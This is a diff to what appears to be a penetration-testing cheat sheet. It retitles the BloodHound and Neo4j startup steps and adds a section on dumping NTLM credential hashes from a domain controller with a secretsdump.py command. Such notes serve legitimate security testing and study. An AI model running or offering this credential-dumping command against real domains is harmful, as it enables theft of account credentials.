@@ -105,14 +105,19 @@ Setup Bloodhound Client
 
 https://github.com/BloodHoundAD/BloodHound/releases
 
-### Starting up Neo4j
+### [Starting up Neo4j]
 ```
 neo4j console
 bolt://localhost:7687
 ```
-### Starting up Bloodhound Client
+### [Starting up Bloodhound Client]
 ```
 ./BloodHound --no-sandbox
+```
+
+### Dumpling Credentials from the Domain Controller
+```
+python3 secretsdump.py -just-dc-ntlm <WORKSTATION>/<username>@IP 
 ```
 
 ### [Download file]
